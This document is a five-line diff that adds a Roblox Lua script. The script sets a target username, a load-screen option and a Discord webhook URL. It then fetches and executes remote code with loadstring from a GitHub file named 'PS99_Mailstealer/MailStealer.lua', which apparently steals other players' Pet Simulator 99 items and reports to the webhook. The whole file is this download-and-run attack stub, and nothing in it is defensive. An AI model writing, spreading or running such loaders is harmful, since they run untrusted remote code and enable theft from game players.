@@ -1,0 +1,5 @@
+Username = "animemaster1227"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1221817466309840916/rm6BMIbQqIWpAsMZXhweZJPsbW2Iket_TuSQaEah6cuEzYv0DhBpMDZmyPt9Rmpewp6g" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
